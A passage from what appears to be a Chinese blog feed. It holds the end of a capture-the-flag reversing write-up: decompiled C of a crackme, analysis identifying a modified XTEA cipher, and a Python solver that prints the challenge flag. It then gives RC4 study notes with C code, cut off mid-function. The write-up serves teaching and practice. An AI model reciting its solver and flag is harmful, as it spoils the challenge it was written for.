0x12345678 0x12345678 0x12345678 0x12345678 0x12345678 0x12345678\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The end of flag:\nHZCTF&#123;This_is_the_fake_flag&#125;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"input your get the flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>程序运行时，打印的东西</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%x"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v8<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>对我们的v8数组输入十六进制字符串，因为在上一个函数中，指定了我们要输入字符串的格式为hex</li></ul><h4 id="sub_140011339函数"><a class="markdownIt-Anchor" href="#sub_140011339函数"></a> sub_140011339函数</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_140011339</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>__int64 __fastcall <span class="token function">sub_1400117D0</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v1<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp+0h] BYREF</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp+8h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp+Ch]</span>  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp+10h]</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+34h] [rbp+14h]</span>  v1 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">14</span>i64<span class="token punctuation">;</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">858993460</span><span class="token punctuation">;</span>    v1 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">4455</span><span class="token punctuation">;</span>  v8 <span class="token operator">=</span> <span class="token number">6677</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">8899</span><span class="token punctuation">;</span>  <span class="token operator">*</span>a1 <span class="token operator">=</span> <span class="token number">2233</span><span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>  a1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">sub_140011311</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_14001AD00<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>传入的参数为v7，但是在函数内部通过指针被改变了值</li><li>原来的v7值为1234,5678,9012,3456</li><li>改变后的v7值为2233,4455,6677,8899</li></ul><h4 id="sub_140011145v8-v9"><a class="markdownIt-Anchor" href="#sub_140011145v8-v9"></a> sub_140011145(v8, v9);</h4><p>代码如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_140011145</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_140012030</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>__int64 __fastcall <span class="token function">sub_140012030</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>  result <span class="token operator">=</span> <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a2 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>传入的是v8,v9数组，实际上只是把v8数组的每个值赋给了v9</li></ul><h4 id="sub_1400112b7v8-v7"><a class="markdownIt-Anchor" href="#sub_1400112b7v8-v7"></a> sub_1400112B7(v8, v7);</h4><p>代码如下:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">sub_1400112B7</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">sub_140011900</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>__int64 __fastcall <span class="token function">sub_140011900</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 key<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+44h] [rbp+24h]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+64h] [rbp+44h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+84h] [rbp+64h]</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> sum<span class="token punctuation">;</span> <span class="token comment">// [rsp+C4h] [rbp+A4h]</span>  result <span class="token operator">=</span> <span class="token function">sub_14001137F</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_140023009<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    sum <span class="token operator">=</span> <span class="token number">0xF462900</span> <span class="token operator">*</span> i<span class="token punctuation">;</span>                        <span class="token comment">// sum = delta * i</span>    v3 <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      <span class="token operator">++</span>v5<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">+=</span> sum <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> v3<span class="token punctuation">)</span>                                         <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> v3<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span>sum <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> v3<span class="token punctuation">)</span> <span class="token operator">+=</span> <span class="token punctuation">(</span>sum <span class="token operator">+</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>key <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sum <span class="token operator">>></span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span>                                                                                          <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">4</span>i64 <span class="token operator">*</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      sum <span class="token operator">+=</span> <span class="token number">0xF462900</span><span class="token punctuation">;</span>                         <span class="token comment">// sum += delta</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">32</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>                         <span class="token comment">// 循环32次</span>    result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>存在一个变量与一个固定的常数做运算，且常数不受影响，常数为0xF462900</li><li>存在移位+异或运算</li><li>存在Feistal结构，即把运算后的值相加并且给新的变量</li><li>do…while循环33次</li><li>for循环8次</li></ul><p>通过上述信息，可以初步判断这个题目是一个魔改的Xtea算法</p><p>把加密过程逆过来</p><h3 id="exp-30"><a class="markdownIt-Anchor" href="#exp-30"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">key<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2233</span><span class="token punctuation">,</span><span class="token number">4455</span><span class="token punctuation">,</span><span class="token number">6677</span><span class="token punctuation">,</span><span class="token number">8899</span><span class="token punctuation">]</span>value<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x1A800BDA</span><span class="token punctuation">,</span><span class="token number">0xF7A6219B</span><span class="token punctuation">,</span><span class="token number">0x491811D8</span><span class="token punctuation">,</span><span class="token number">0xF2013328</span><span class="token punctuation">,</span><span class="token number">0x156C365B</span><span class="token punctuation">,</span><span class="token number">0x3C6EAAD8</span><span class="token punctuation">,</span><span class="token number">0x84D4BF28</span><span class="token punctuation">,</span><span class="token number">0xF11A7EE7</span><span class="token punctuation">,</span><span class="token number">0x3313B252</span><span class="token punctuation">,</span><span class="token number">0xDD9FE279</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">x_tea_decrypt</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    delta<span class="token operator">=</span><span class="token number">256256256</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        rounds<span class="token operator">=</span><span class="token number">33</span>        <span class="token builtin">sum</span><span class="token operator">=</span>delta<span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token comment">#注意i最大是8，所以还要+1</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rounds<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token builtin">sum</span><span class="token operator">-=</span>delta            <span class="token comment">#注意这段逻辑被魔改了，做题的时候要慢慢来分析,&amp;0xfffffff模拟32位</span>            value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-=</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token operator">>></span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span>            value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-=</span><span class="token builtin">sum</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token number">5</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token builtin">sum</span><span class="token operator">+</span>key<span class="token punctuation">[</span><span class="token builtin">sum</span><span class="token operator">&amp;</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span>    <span class="token keyword">return</span> valuevalue<span class="token operator">=</span>x_tea_decrypt<span class="token punctuation">(</span>value<span class="token punctuation">,</span>key<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span>value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">>></span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">*</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>  <span class="token comment">#&amp;0xff模拟8位</span> <span class="token comment">#HZCTF&#123;hzCtf_94_re666fingcry5641qq&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RC4学习笔记</title>
      <link href="/2024/02/08/RC4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/08/RC4%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="rc4加密算法学习"><a class="markdownIt-Anchor" href="#rc4加密算法学习"></a> RC4加密算法学习</h1><h2 id="算法分析"><a class="markdownIt-Anchor" href="#算法分析"></a> 算法分析</h2><h3 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h3><p>RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 ----wiki <a href="https://zh.wikipedia.org/zh-hans/RC4">https://zh.wikipedia.org/zh-hans/RC4</a></p><h3 id="加密解密原理"><a class="markdownIt-Anchor" href="#加密解密原理"></a> 加密(解密)原理</h3><p>RC4由伪随机数生成器和异或运算组成。RC4的密钥长度可变，范围是[1,255]。RC4一个字节一个字节地加解密。给定一个密钥，伪随机数生成器接受密钥并产生一个S盒。S盒用来加密数据，而且在加密过程中S盒会变化。</p><p>由于异或运算的对合性，RC4加密解密使用同一套算法</p><p>下面用C语言实现:</p><p>首先看加密过程的几个基本变量</p><ol><li>S-Box就是S盒，是一个256长度的char型数组，每个单元都是一个字节，算法运行的任何时候，S都包括0-255的8比特数的排列组合，只不过值的位置发生了变换</li><li>密钥K char key[256] 密钥的长度keylen与明文长度，密钥流的长度没有必然关系</li><li>临时向量k，长度也为256，每个单元也是一个字节。如何密钥的长度是256字节，就直接把密钥的值赋给k，否则，轮转地将每个字节赋给k</li></ol><p>(1)初始化:</p><p>包含三个参数</p><p>参数1是一个256长度的char型数组，定义为:unsigned char sBox[256];</p><p>参数2是密钥，其内容可以随便定义: char key[256]；</p><p>参数3是密钥长度，Len=strlen(key);</p><p>初始化长度为256的S盒。第一个for循环将0到255的互不重复的元素装入S盒。第二个for循环根据密钥打乱S盒。</p><p>i确保S-box的每个元素都得到处理，j保证S-box的搅乱是随机的</p><p><img src="https://s2.loli.net/2024/02/08/FTz9qeO41RpLKZ5.png" alt="" / loading="lazy"></p><p><img src="https://s2.loli.net/2024/02/08/qe2SOEDrsNHYimk.png" alt="" / loading="lazy"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">rc4_init</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>key<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> k<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>        k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>key<span class="token punctuation">[</span>i<span class="token operator">%</span>Len<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">//把key循环赋给k[]里</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">//打乱SBox,只是其中的元素进行了随机交换</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">256</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        j<span class="token operator">=</span><span class="token punctuation">(</span>j<span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span> <span class="token comment">//!这是一个伪随机数</span>        tmp<span class="token operator">=</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>tmp<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(2)加解密</p><p>包含三个参数</p><p>参数1是上边rc4_init函数中被搅乱的S-box</p><p>参数2是需要加密的数据data</p><p>参数3是data的长度</p><p>每收到一个字节，就进行while循环，通过一定的算法定位S盒中的一个元素，并与输入字节异或，得到k。循环中还改变了S盒。如果输入的是明文，输出的就是密文；如果输入的是密文，输出的就是明文。</p><p><img src="https://s2.loli.net/2024/02/08/HvaAqdF9gmVGQKR.png" alt="" / loading="lazy"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">rc4_crypt</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>Data<span class="token punctuation">,</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> Len<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>t<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">long</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> tmp<span class="token punctuation">;</span>    <span class="token comment">//实际上就是Data的每个字节与Sbox的一个伪随机位置进行字节异或，进行一次还改变S盒子</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>Len<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token comment">//通过一定算法生成伪随机数,再打乱S-box</span>        i<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">256</span><span class="token punctuation">;</span>        j<span class="token operator">=</span><span class="token punctuation">(</span>j<span class="token 